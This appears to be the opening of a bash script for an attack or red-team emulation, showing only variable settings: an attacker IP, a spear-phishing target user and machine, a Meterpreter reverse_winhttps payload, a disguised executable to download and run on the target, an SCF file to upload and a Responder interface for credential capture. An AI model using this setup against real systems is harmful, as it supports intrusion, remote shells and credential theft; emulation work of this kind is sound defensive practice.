#!/bin/bash

# Set variables
AttackerIP="17.93.8.3" # Attacker IP address
TargetSaltName="hn-wks-01" # Machine of initial access
TargetUsername="young.zaffina" # Spear phishing target username
InitialAccessPort="42152" # Port to use for the Initial Access Meterpreter reverse_winhttps connection
MSFPayload="windows/x64/meterpreter/reverse_winhttps" # MSF Meterpreter payload to use for elevated session
PayloadName="gpdmonitor.exe" # Name of the Meterpreter payload to download and run on the target
SCFName="test.scf" # Name of the SCF file to create and upload to the target
Interface="eth2" # Interface to use for Responder